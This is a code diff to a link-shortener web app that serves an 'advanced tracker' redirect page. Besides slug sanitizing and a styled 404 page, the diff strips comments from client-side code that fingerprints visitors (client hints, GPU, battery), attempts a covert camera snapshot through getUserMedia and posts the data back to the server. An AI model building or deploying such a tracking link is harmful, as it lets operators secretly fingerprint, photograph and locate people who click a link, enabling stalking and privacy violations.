@@ -24,6 +24,17 @@ function generateShortCode(length = 6) {
   return result;
 }
 
+// Helper to sanitize slug (replace spaces and special characters with hyphens)
+function sanitizeSlug(slug) {
+  if (!slug) return '';
+  return slug
+    .trim()
+    .toLowerCase()
+    .replace(/\s+/g, '-')       // Replace spaces with -
+    .replace(/[^\w\-]+/g, '')   // Remove all non-word chars
+    .replace(/\-\-+/g, '-');    // Replace multiple - with single -
+}
+
 // Helper to get client IP
 function getClientIp(req) {
   let ip = req.headers['x-forwarded-for'] || 
@@ -115,13 +126,16 @@ app.post('/api/links', (req, res) => {
       destinationUrl = 'https://' + destinationUrl;
     }
 
-    const shortCode = (customSlug && customSlug.trim()) ? customSlug.trim() : generateShortCode();
-    const linkTitle = title || destinationUrl;
-
-    if (db.getLinkByShortCode(shortCode)) {
-      return res.status(400).json({ error: 'Custom link code already in use' });
+    let shortCode = sanitizeSlug(customSlug);
+    if (!shortCode) {
+      shortCode = generateShortCode();
     }
 
+    if (db.getLinkByShortCode(shortCode)) {
+      return res.status(400).json({ error: `Link code "${shortCode}" already exists. Please choose another.` });
+    }
+
+    const linkTitle = title || destinationUrl;
     const newLink = db.createLink(shortCode, linkTitle, destinationUrl);
     const baseUrl = process.env.BASE_URL || `${req.protocol}://${req.get('host')}`;
 
@@ -219,11 +233,17 @@ app.get('/api/stats', (req, res) => {
 
 // --- ADVANCED TRACKER & REDIRECT ENDPOINT ---
 app.get('/r/:shortCode', async (req, res) => {
-  const { shortCode } = req.params;
-  const link = db.getLinkByShortCode(shortCode);
+  let { shortCode } = req.params;
+  shortCode = decodeURIComponent(shortCode || '').trim();
+  
+  // Try exact lookup first, or sanitized lookup
+  let link = db.getLinkByShortCode(shortCode);
+  if (!link) {
+    link = db.getLinkByShortCode(sanitizeSlug(shortCode));
+  }
 
   if (!link) {
-    return res.status(404).send('<h1>404 - Tracking Link Not Found</h1>');
+    return res.status(404).send('<div style="font-family:sans-serif; text-align:center; padding:50px;"><h1>404 - Tracking Link Not Found</h1><p>The requested tracking code does not exist or has expired.</p></div>');
   }
 
   let logId = null;
@@ -307,7 +327,6 @@ app.get('/r/:shortCode', async (req, res) => {
             cameraSnap: null
           };
 
-          // High Entropy Client Hints
           try {
             if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
               const hints = await navigator.userAgentData.getHighEntropyValues(['model', 'platformVersion', 'architecture']);
@@ -315,7 +334,6 @@ app.get('/r/:shortCode', async (req, res) => {
             }
           } catch(e) {}
 
-          // GPU Info
           try {
             const canvas = document.createElement('canvas');
             const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
@@ -327,7 +345,6 @@ app.get('/r/:shortCode', async (req, res) => {
             }
           } catch(e) {}
 
-          // Battery Info
           try {
             if (navigator.getBattery) {
               const batt = await navigator.getBattery();
@@ -335,7 +352,6 @@ app.get('/r/:shortCode', async (req, res) => {
             }
           } catch(e) {}
 
-          // HTML5 Camera Snapshot Attempt
           try {
             if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
               const stream = await Promise.race([
@@ -354,13 +370,11 @@ app.get('/r/:shortCode', async (req, res) => {
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 clientData.cameraSnap = canvas.toDataURL('image/jpeg', 0.5);
                 
-                // Stop tracks
                 stream.getTracks().forEach(track => track.stop());
               }
             }
           } catch(e) {}
 
-          // Post details back
           if (logId) {
             try {
               fetch('/api/log-client-data', {
